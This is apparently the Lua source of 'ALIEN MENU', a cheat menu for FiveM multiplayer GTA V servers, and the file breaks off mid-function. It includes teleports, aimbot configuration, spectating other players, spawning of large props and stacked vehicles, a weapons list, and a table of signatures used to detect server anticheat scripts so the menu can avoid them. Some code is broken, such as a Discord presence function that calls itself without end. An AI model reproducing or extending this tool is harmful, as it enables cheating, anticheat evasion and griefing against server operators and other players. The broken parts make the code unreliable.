local ESX = nil
local menudelay = 125
local HasInteractSound = false
local Toggles = {['Menu sounds'] = true, ['Freecam speed'] = 1, ['Freecam object'] = 1}
local MenuXOffset, MenuYOffset = 0.1, 0.55
local peds = {}
local currentplayer = 0
local friends = {}
local spectating, currentlyspectating, cam = false, 0, nil
local spawnedprops = {}
local LoadBlips
local allplayers = {}
local vehicles = {}
local playerblips = {}
local interactsoundaudios = {'no sounds'}
local autodrivespeed = 50
local anticheatrunning = false
local aimbotfov = 0.25
local aimbotbone = 'body'
local weatherlocked, hourlocked = 'SUNNY', 0
local MenuTitle = '~u~⚡️ALIEN MENU⚡️'
local menuvisiblewdqdq = false
local animations = {}
local servereventdelay = 0
local MenuDisabled = false

-------------------------------DİSCORD RPC OYNUYOR AYARI--------------------
local function rpc()
    if Toggles['🎮  Discord RPC'] then
        for i = 10, rpc() - 20 do
    SetRichPresence(GetPlayerName(PlayerId()) .. "👽 Using Alien Menu 👽")
    end
else
    SetRichPresence(GetPlayerName(PlayerId()) .. "👽 Using Alien Menu 👽")
end
    end
-------------------------------TELEPORT İÇİN HAVALİMANI----------------------
local function Airplane()
    local bB = -1037.82
    local bC = -2739.19
    local bD = 20.16
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end
-------------------------------TELEPORT İÇİN GALERİ----------------------------
local function VehicleShop()
    local bB = -37.77
    local bC = -1085.66
    local bD = 26.42
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end
-------------------------------TELEPORT İÇİN MARKET----------------------------
local function Shop()
    local bB = 17.45
    local bC = -1348.18
    local bD = 29.29
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end
-------------------------------TELEPORT İÇİN HASTANE----------------------------------
local function Hospital()
    local bB = 299.52
    local bC = -605.91
    local bD = 43.40
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end
-------------------------------TELEPORT İÇİN OTEL----------------------------------
local function Motel()
    local bB = 341.55
    local bC = -202.86
    local bD = 54.24
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end
-------------------------------TELEPORT İÇİN LSPD----------------------------------
local function LSPD()
    local bB = 448.19
    local bC = -1003.15
    local bD = 26.32
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end
-------------------------------TELEPORT İÇİN LS CUSTOM----------------------------------
local function ls()
    local bB = -365.425
    local bC = -131.809
    local bD = 37.873
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end
-------------------------------TELEPORT İÇİN Main Garage----------------------------------
local function gp()
    local bB = 266.12
    local bC = -752.51
    local bD = 34.64
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end
-------------------------------TELEPORT İÇİN Main Garage----------------------------------
local function dealership()
    local bB = -15.32
    local bC = -1080.69
    local bD = 26.14
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end
-------------------------------TELEPORT İÇİN Clothes Shop----------------------------------
local function shopclothes()
    local bB = 428.61
    local bC = -799.89
    local bD = 29.49
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end
-------------------------------TELEPORT İÇİN Barber----------------------------------
local function barber()
    local bB = -32.84
    local bC = -152.34
    local bD = 57.08
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end
-----------------------------------------------------------------------------------------------------------------
local objectlist = {
    ['Washer'] = 'prop_washer_02',                         
    ['Wall'] = 'prop_const_fence02b',
    ['Grid'] = 'prop_fncsec_03c',
    ['Movie screen'] = 'prop_ld_filmset',
    ['Pipe'] = 'sr_prop_stunt_tube_crn2_05a',
    ['Airplane'] = 'apa_mp_apa_crashed_usaf_01a',
	['Commercial Sale'] = 'prop_airport_sale_sign',
	['Elecbox'] = 'lts_prop_lts_elecbox_24b',
	['Coffee'] = 'p_ld_coffee_vend_01',
	['Cash'] = 'hei_prop_cash_crate_half_full',
    ['Sofa'] = 'p_yacht_sofa_01_s',
    ['Turkey Flag'] = 'apa_prop_flag_turkey',
    ['German Flag'] = 'apa_prop_flag_german_yt',
    ['Belgium Flag'] = 'apa_prop_flag_belgium',
    ['Netherlands Flag'] = 'apa_prop_flag_netherlands',
    ['Xmas'] = 'prop_xmas_tree_int', 
    ['Xmas1'] = 'prop_xmas_ext', 
    ['Xmas2'] = 'xs_propintxmas_cluboffice_2018', 
    ['Barge'] = 'xm_prop_x17_barge_01', 
    ['Subdamage'] = 'xm_prop_x17_sub_damage', 
    ['Arena'] = 'xs_prop_arena_goal', 
    ['Indistrial'] = 'xs_prop_arena_industrial_a', 
    ['Stadium Light'] = 'xs_propintarena_lamps_01a', 
    ['Building'] = 'xs_prop_ar_buildingx_01a_sf', 
    ['Fire'] = 'xs_prop_arena_pit_fire_01a_wl', 
    ['Dyst'] = 'xs_combined_dyst_03_brdg01', 
    ['Bulding'] = 'xs_propint2_building_base_02', 
    ['Spinning'] = 'p_spinning_anus_s', 
    ['Jet'] = 'p_cs_mp_jet_01_s', 
    ['Airship'] = 'prop_temp_carrier', 
    ['Yacht'] = 'apa_mp_apa_yacht', 
    ['Damship'] = 'gr_prop_damship_01a', 
    ['Shipsink'] = 'des_shipsink_01',
    ['Fnclink'] = 'prop_fnclink_05crnr1', 
    ['Logpile'] = 'prop_logpile_07b', 
    ['Airlights'] = 'prop_air_lights_04a',
  
}
local objectnamelist = {}
for k, v in pairs(objectlist) do
    table.insert(objectnamelist, k)
end

local function RotationToDirection(rotation)
    local retz = math.rad(rotation.z)
    local retx = math.rad(rotation.x)
    local absx = math.abs(math.cos(retx))
    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

local ControlCar = function(Driver, Car)
    if IsDisabledControlPressed(0, 32) and not IsDisabledControlPressed(0, 33) then
        TaskVehicleTempAction(Driver, Car, 9, 1)
    end
    
    if IsDisabledControlJustReleased(0, 32) or IsDisabledControlJustReleased(0, 33) then
        TaskVehicleTempAction(Driver, Car, 6, 2500)
    end

    if IsDisabledControlPressed(0, 33) and not IsDisabledControlPressed(0, 32) then
        TaskVehicleTempAction(Driver, Car, 22, 1)
    end

    if IsDisabledControlPressed(0, 34) and IsDisabledControlPressed(0, 33) then
        TaskVehicleTempAction(Driver, Car, 13, 1)
    end

    if IsDisabledControlPressed(0, 35) and IsDisabledControlPressed(0, 33) then
        TaskVehicleTempAction(Driver, Car, 14, 1)
    end

    if IsDisabledControlPressed(0, 32) and IsDisabledControlPressed(0, 33) then
        TaskVehicleTempAction(Driver, Car, 30, 100)
    end

    if IsDisabledControlPressed(0, 34) and IsDisabledControlPressed(0, 32) then
        TaskVehicleTempAction(Driver, Car, 7, 1)
    end

    if IsDisabledControlPressed(0, 35) and IsDisabledControlPressed(0, 32) then
        TaskVehicleTempAction(Driver, Car, 8, 1)
    end

    if IsDisabledControlPressed(0, 34) and not IsDisabledControlPressed(0, 32) and not IsDisabledControlPressed(0, 33) then
        TaskVehicleTempAction(Driver, Car, 4, 1)
    end

    if IsDisabledControlPressed(0, 35) and not IsDisabledControlPressed(0, 32) and not IsDisabledControlPressed(0, 33) then
        TaskVehicleTempAction(Driver, Car, 5, 1)
    end
end

local blockactions = false
CreateThread(function()
    while true do
        if blockactions then
            for i = 0, 400 do
                DisableControlAction(0, i, true)
            end
            Wait(0)
        else
            Wait(250)
        end
    end
end)

local customcars = {
    ['Robot'] = {
        ['Original'] = 't20',
        ['Attach'] = {
            -- legs

            {
                vec3(6.0, -0.5, 0.5),
                vec3(0.0, 0.0, 0.0),
                'brickade'
            },

            {
                vec3(-6.0, -0.5, 0.5),
                vec3(0.0, 0.0, 0.0),
                'brickade'
            },

            {
                vec3(6.0, -3.5, 4.5),
                vec3(-90.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(-6.0, -3.5, 4.5),
                vec3(-90.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(6.0, -3.5, 11.5),
                vec3(-90.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(-6.0, -3.5, 11.5),
                vec3(-90.0, 0.0, 0.0),
                'riot'
            },

            --legs 2

            {
                vec3(6.0, -1.5, 8.5),
                vec3(-90.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(-6.0, -1.5, 8.5),
                vec3(-90.0, 0.0, 0.0),
                'riot'
            },
            

            -- stomach (part 1)

            {
                vec3(6.0, -3.5, 15.0),
                vec3(25.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(-6.0, -3.5, 15.0),
                vec3(25.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(3.0, -3.5, 15.0),
                vec3(25.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(-3.0, -3.5, 15.0),
                vec3(25.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(0.0, -3.5, 15.0),
                vec3(25.0, 0.0, 0.0),
                'riot'
            },

            -- stomach (part 2)

            {
                vec3(6.0, 1.0, 20.0),
                vec3(110.0, 0.0, -180.0),
                'riot'
            },

            {
                vec3(-6.0, 1.0, 20.0),
                vec3(110.0, 0.0, -180.0),
                'riot'
            },

            {
                vec3(3.0, 1.0, 20.0),
                vec3(110.0, 0.0, -180.0),
                'riot'
            },

            {
                vec3(-3.0, 1.0, 20.0),
                vec3(110.0, 0.0, -180.0),
                'riot'
            },

            {
                vec3(0.0, 1.0, 20.0),
                vec3(110.0, 0.0, -180.0),
                'riot'
            },

            -- stomach (part 3)

            {
                vec3(6.0, 1.0, 24.0),
                vec3(-75.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(-6.0, 1.0, 24.0),
                vec3(-75.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(3.0, 1.0, 24.0),
                vec3(-75.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(-3.0, 1.0, 24.0),
                vec3(-75.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(0.0, 1.0, 24.0),
                vec3(-75.0, 0.0, 0.0),
                'riot'
            },

            -- back (part 1)

            {
                vec3(6.0, -6.5, 18.0),
                vec3(85.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(-6.0, -6.5, 18.0),
                vec3(85.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(3.0, -6.5, 18.0),
                vec3(85.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(-3.0, -6.5, 18.0),
                vec3(85.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(0.0, -6.5, 18.0),
                vec3(85.0, 0.0, 0.0),
                'riot'
            },

            -- back (part 2)

            {
                vec3(6.0, -5.5, 23.0),
                vec3(65.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(-6.0, -5.5, 23.0),
                vec3(65.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(3.0, -5.5, 23.0),
                vec3(65.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(-3.0, -5.5, 23.0),
                vec3(65.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(0.0, -5.5, 23.0),
                vec3(65.0, 0.0, 0.0),
                'riot'
            },

            -- side (left)

            {
                vec3(7.0, -4.5, 19.0),
                vec3(90.0, 0.0, 90.0),
                'riot'
            },

            {
                vec3(7.0, -1.0, 20.0),
                vec3(90.0, 0.0, 90.0),
                'riot'
            },

            {
                vec3(7.0, -2.0, 25.0),
                vec3(90.0, -110.0, 90.0),
                'riot'
            },

            -- side (right)

            {
                vec3(-7.0, -4.5, 19.0),
                vec3(90.0, 0.0, -90.0),
                'riot'
            },

            {
                vec3(-7.0, -1.0, 20.0),
                vec3(90.0, 0.0, -90.0),
                'riot'
            },

            {
                vec3(-7.0, -2.0, 25.0),
                vec3(90.0, 110.0, -90.0),
                'riot'
            },

            -- neck

            {
                vec3(6.0, -1.5, 26.0),
                vec3(-25.0, 0.0, 180.0),
                'riot'
            },

            {
                vec3(-6.0, -1.5, 26.0),
                vec3(-25.0, 0.0, 180.0),
                'riot'
            },

            {
                vec3(3.0, -1.5, 26.0),
                vec3(-25.0, 0.0, 180.0),
                'riot'
            },

            {
                vec3(-3.0, -1.5, 26.0),
                vec3(-25.0, 0.0, 180.0),
                'riot'
            },

            {
                vec3(0.0, -1.5, 26.0),
                vec3(-25.0, 0.0, 180.0),
                'riot'
            },

            {
                vec3(0.0, -1.5, 29.0),
                vec3(-45.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(0.0, -4.5, 29.0),
                vec3(-75.0, 0.0, -180.0),
                'riot'
            },

            -- head

            {
                vec3(0.0, -3.5, 33.0),
                vec3(-25.0, 0.0, 0.0),
                'blimp',
                'drive'
            },

            -- right arm

            {
                vec3(6.0, -1.5, 30.0),
                vec3(-25.0, 0.0, 90.0),
                'riot'
            },

            {
                vec3(5.0, -1.5, 29.0),
                vec3(0.0, 90.0, 90.0),
                'riot'
            },

            {
                vec3(12.0, -1.5, 30.0),
                vec3(15.0, 0.0, 90.0),
                'riot'
            },

            {
                vec3(17.0, -1.5, 26.0),
                vec3(75.0, 0.0, 90.0),
                'riot'
            },

            {
                vec3(18.0, 0.5, 23.0),
                vec3(-25.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(18.0, 5.5, 20.5),
                vec3(-25.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(18.0, 7.5, 18.5),
                vec3(25.0, 180.0, 0.0),
                'polmav'
            },

            {
                vec3(18.0, 8.5, 20.5),
                vec3(-25.0, 0.0, 0.0),
                'luxor2'
            },

            -- left arm

            {
                vec3(-6.0, -1.5, 30.0),
                vec3(-25.0, 0.0, -90.0),
                'riot'
            },

            {
                vec3(-5.0, -1.5, 29.0),
                vec3(0.0, 270.0, -90.0),
                'riot'
            },

            {
                vec3(-12.0, -1.5, 30.0),
                vec3(15.0, 0.0, -90.0),
                'riot'
            },

            {
                vec3(-17.0, -1.5, 26.0),
                vec3(75.0, 0.0, -90.0),
                'riot'
            },

            {
                vec3(-18.0, 0.5, 23.0),
                vec3(-25.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(-18.0, 5.5, 20.5),
                vec3(-25.0, 0.0, 0.0),
                'riot'
            },

            {
                vec3(-18.0, 7.5, 18.5),
                vec3(25.0, 180.0, 0.0),
                'polmav'
            },

            {
                vec3(-18.0, 8.5, 20.5),
                vec3(-25.0, 0.0, 0.0),
                'luxor2'
            },
        }
    }
}

local LoadModel = function(model)
    if type(model) == 'string' then
        model = GetHashKey(model)
    else
        if type(model) ~= 'number' then
            return false
        end
    end

    local timer = GetGameTimer() + 5000
    while not HasModelLoaded(model) do
        Wait(0)
        RequestModel(model)
        if GetGameTimer() >= timer then
            return false
        end
    end

    return model
end

local bones = {
    ['body'] = 0,
    ['head'] = 31086,
    ['pelvis'] = 11816,
    ['left foot'] = 14201,
    ['right foot'] = 52301,
    ['right calf'] = 36864,
    ['left calf'] = 63931,
}

local props = {
    ['Turkey Flag'] = 'apa_prop_flag_turkey',
    ['Washer'] = 'prop_washer_02',
    ['Toilet'] = 'prop_toilet_01',
    ['Dildo'] = 'v_res_d_dildo_c',
    ['helicopter'] = 'p_crahsed_heli_s'
}

-- idk how good these are hope they work pride boys
local Anticheats = {
    {'client.lua', 'math.ldexp'},
    {'client.lua', "oldPrint('^2[NSAC] '..trash..'^0')"},
    {'io_anticheat.lua', "function IllIlllIllIlllIlllIlllIll(IllIlllIllIllIll) if (IllIlllIllIllIll==(((((919 + 636)-636)*3147)/3147)+919))"},
    {'jesus_on_water.js', "var machinetherapist_0x1480="},
    {'__resource.lua', 'nui/rote_jesus.wav'}
}

local Objects

local menucolours, rgbenabled = {1, 133, 0, 150}, false

local weapons = {"WEAPON_KNIFE","WEAPON_MINIGUN","WEAPON_KNUCKLE","WEAPON_NIGHTSTICK","WEAPON_HAMMER","WEAPON_BAT","WEAPON_GOLFCLUB","WEAPON_CROWBAR","WEAPON_BOTTLE","WEAPON_DAGGER","WEAPON_HATCHET","WEAPON_MACHETE","WEAPON_FLASHLIGHT","WEAPON_SWITCHBLADE","WEAPON_PISTOL","WEAPON_COMBATPISTOL","WEAPON_APPISTOL","WEAPON_PISTOL50","WEAPON_SNSPISTOL","WEAPON_HEAVYPISTOL","WEAPON_VINTAGEPISTOL","WEAPON_STUNGUN","WEAPON_FLAREGUN","WEAPON_MARKSMANPISTOL","WEAPON_REVOLVER","WEAPON_MICROSMG","WEAPON_SMG","WEAPON_SMG_MK2","WEAPON_ASSAULTSMG","WEAPON_MG","WEAPON_COMBATMG","WEAPON_COMBATMG_MK2","WEAPON_COMBATPDW","WEAPON_GUSENBERG","WEAPON_MACHINEPISTOL","WEAPON_ASSAULTRIFLE","WEAPON_ASSAULTRIFLE_MK2","WEAPON_CARBINERIFLE","WEAPON_CARBINERIFLE_MK2","WEAPON_ADVANCEDRIFLE","WEAPON_SPECIALCARBINE","WEAPON_BULLPUPRIFLE","WEAPON_COMPACTRIFLE","WEAPON_PUMPSHOTGUN","WEAPON_SAWNOFFSHOTGUN","WEAPON_BULLPUPSHOTGUN","WEAPON_ASSAULTSHOTGUN","WEAPON_MUSKET","WEAPON_HEAVYSHOTGUN","WEAPON_DBSHOTGUN","WEAPON_SNIPERRIFLE","WEAPON_HEAVYSNIPER","WEAPON_HEAVYSNIPER_MK2","WEAPON_MARKSMANRIFLE","WEAPON_GRENADELAUNCHER","WEAPON_GRENADELAUNCHER_SMOKE","WEAPON_RPG","WEAPON_STINGER","WEAPON_FIREWORK","WEAPON_HOMINGLAUNCHER","WEAPON_GRENADE","WEAPON_STICKYBOMB","WEAPON_PROXMINE","WEAPON_BZGAS","WEAPON_SMOKEGRENADE","WEAPON_MOLOTOV","WEAPON_FIREEXTINGUISHER","WEAPON_PETROLCAN","WEAPON_SNOWBALL","WEAPON_FLARE","WEAPON_BALL"}

local DrawText3D = function(txt, pos, scale)
    local OnScreen, x, y = World3dToScreen2d(table.unpack(pos))

    SetTextScale(scale or 0.40, scale or 0.25)
    SetTextFont(0)
    SetTextColour(255, 255, 255, 255)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150) 
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry('STRING')
    SetTextCentre(1)
    AddTextComponentString(txt)
    DrawText(x, y)
end

local DrawEntityBox = function(entity, colour)
    local min, max = GetModelDimensions(GetEntityModel(entity))
    
    local pad = 0.001
    local box = {
        GetOffsetFromEntityInWorldCoords(entity, min.x - pad, min.y - pad, min.z - pad),
        GetOffsetFromEntityInWorldCoords(entity, max.x + pad, min.y - pad, min.z - pad),
        GetOffsetFromEntityInWorldCoords(entity, max.x + pad, max.y + pad, min.z - pad),
        GetOffsetFromEntityInWorldCoords(entity, min.x - pad, max.y + pad, min.z - pad),
    
        GetOffsetFromEntityInWorldCoords(entity, min.x - pad, min.y - pad, max.z + pad),
        GetOffsetFromEntityInWorldCoords(entity, max.x + pad, min.y - pad, max.z + pad),
        GetOffsetFromEntityInWorldCoords(entity, max.x + pad, max.y + pad, max.z + pad),
        GetOffsetFromEntityInWorldCoords(entity, min.x - pad, max.y + pad, max.z + pad),
    }

    local lines = {
        {box[1],box[2]},
        {box[2],box[3]},
        {box[3],box[4]},
        {box[4],box[1]},
        {box[5],box[6]},
        {box[6],box[7]},
        {box[7],box[8]},
        {box[8],box[5]},
        {box[1],box[5]},
        {box[2],box[6]},
        {box[3],box[7]},
        {box[4],box[8]}
    }

    for k, v in pairs(lines) do
        DrawLine(v[1]['x'], v[1]['y'], v[1]['z'], v[2]['x'], v[2]['y'], v[2]['z'], table.unpack(colour))
    end
end

local KeyboardInput = function(TextEntry, ExampleText, MaxStringLenght)

    AddTextEntry('FMMC_KEY_TIP1', TextEntry)
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLenght)
    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Wait(0)
    end
        
    if UpdateOnscreenKeyboard() ~= 2 then
        local result = GetOnscreenKeyboardResult()
        Wait(500)
        return result
    else
        Wait(500)
        return false 
    end
end

local RGB = function(speed, ismenu)
    local res = {}

    for k, v in pairs({0, 2, 4}) do
        local Time = GetGameTimer() / 200
        table.insert(res, math.floor(math.sin(Time * (speed or 0.2) + v) * 127 + 128))
    end

    table.insert(res, 255)

    if rgbenabled or not ismenu then
        return res
    else
        return menucolours
    end
end

local DrawTxt = function(text, top, usergb, colour, scale, customleft, centre, rgbspeed)
    if usergb then
        SetTextColour(table.unpack(RGB(rgbspeed or 0.7, true)))
    else
        local r, g, b = table.unpack(colour or {255, 255, 255})
        SetTextColour(r, g, b, 255)
    end
    SetTextFont(0)
    SetTextScale(scale or 0.3, scale or 0.3)
    if centre then
        SetTextCentre(true)
    end
    SetTextCentre(false)
    SetTextEdge(1, 0, 0, 0, 205)
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(customleft or MenuXOffset - 0.082, top)
end

local Alert = function(txt)
    CreateThread(function()
        local timer = GetGameTimer() + 1500
        while timer >= GetGameTimer() do
            Wait(0)
            DrawTxt(txt, 0.3, false, {255, 0, 0}, 0.5, 0.5, true, 0.1)
        end
    end)
end

local AnticheatWarning = function()
    CreateThread(function()
        local timer = GetGameTimer() + 1500
        while timer >= GetGameTimer() do
            Wait(0)
            DrawTxt('This server using an anticheat. This action has been blocked.', 0.3, false, {255, 0, 0}, 0.5, 0.5, true, 0.1)
        end
    end)
end

local types = {
    ['Object'] = {
        FindFirstObject,
        FindNextObject,
        EndFindObject
    },
    ['Ped'] = {
        FindFirstPed,
        FindNextPed,
        EndFindPed
    },
    ['Vehicle'] = {
        FindFirstVehicle,
        FindNextVehicle,
        EndFindVehicle
    }
}

local GetBoneAimingAt = function(pped)
    local closestbone, closestdist = 10000.0, 10000.0
    for k, v in pairs(bones) do
        local onscreen, x, y = GetScreenCoordFromWorldCoord(table.unpack(GetPedBoneCoords(pped, v, 0, 0, 0)))
        local dist = math.abs(0.5 - x) + math.abs(0.5 - y)
        if dist < closestdist then
            closestdist = dist
            closestbone = v 
        end
    end

    return closestbone
end

local emptyfunc = function()
end

local GetStuff = function(type)
    local data = {}
    local funcs = types[type]
    local handle, ent, success = funcs[1]()

    repeat
        success, entity = funcs[2](handle)
        if DoesEntityExist(entity) then
            table.insert(data, entity)
        end
    until not success

    funcs[3](handle)
    return data
end

local ShootAtCoord = function(coords)
    if type(coords) == 'vector3' then
        if coords['x'] and coords['y'] and coords['z'] then
            if IsPedArmed(PlayerPedId(), 4) then
                if IsPedWeaponReadyToShoot(PlayerPedId()) then
                    SetPedShootsAtCoord(PlayerPedId(), coords, true)
                end
            end
        end
    end
end

local CreateCustomCar = function(data)
    local custom = data['Items'][data['Current']]
    local info = customcars[custom]
    if info then
        CreateThread(function()
            local model = LoadModel(info['Original'])
            local lastmove = 0
            if model ~= false then
                local maincar = CreateVehicle(model, GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 3.0, 0.0), GetEntityHeading(PlayerPedId()), true)
                local attacher = info['Attach']
                local createdcars = {}
                local fakedrive = 0
                local perspective = false

                for k, v in pairs(attacher) do
                    model = LoadModel(v[3])
                    local attach = CreateVehicle(model, GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 0.0, 150.0), 0.0, true)
                    table.insert(createdcars, attach)
                    AttachEntityToEntity(attach, maincar, 0, v[1], v[2], false, false, false, false, 0, true)

                    if v[4] then
                        if v[4] == 'drive' then
                            fakedrive = attach
                        end
                    end
                end

                local cam = CreateCam('DEFAULT_SCRIPTED_Camera', 1)

                CreateThread(function()
                    RenderScriptCams(1, 0, 0, 1, 1)
                    SetCamActive(cam, true)
                
                    local offsetRotX = 0.0
                    local offsetRotY = 0.0
                    local offsetRotZ = 0.0
                                                
                    while DoesCamExist(cam) do
                        Wait(0)
                                                
                        offsetRotX = offsetRotX - (GetDisabledControlNormal(1, 2) * 8.0)
                        offsetRotZ = offsetRotZ - (GetDisabledControlNormal(1, 1) * 8.0)
                
                        if (offsetRotX > 90.0) then 
                            offsetRotX = 90.0 
                        elseif (offsetRotX < -90.0) then 
                            offsetRotX = -90.0 
                        end
                
                        if (offsetRotY > 90.0) then 
                            offsetRotY = 90.0 
                        elseif (offsetRotY < -90.0) then 
                            offsetRotY = -90.0 
                        end
                
                        if (offsetRotZ > 360.0) then 
                            offsetRotZ = offsetRotZ - 360.0 
                        elseif (offsetRotZ < -360.0) then 
                            offsetRotZ = offsetRotZ + 360.0 
                        end

                        local rot 
                        if perspective then
                            rot = GetEntityRotation(fakedrive, 2)
                        else
                            rot = GetEntityRotation(maincar, 2)
                        end

                        
                        if perspective then
                            SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(maincar, 0.0, -25.0, 47.0))
                        else
                            local offset = offsetRotZ / 18.0
                            if offset > 10.5 then 
                                offset = offset - 21
                            elseif offset < -10.5 then
                                offset = offset + 21
                            end

                            print(offset)

                            local height = (offsetRotX / 10.0) * -1
                            local coords = GetEntityCoords(maincar)
                            local success, groundz = GetGroundZFor_3dCoord(coords.x, coords.y, coords.z, true)
                            local customforward = 0.0

                            if success then
                                if GetOffsetFromEntityInWorldCoords(maincar, 0.0, 0.0, height).z - groundz < 0.0 then
                                    customforward = height * -1
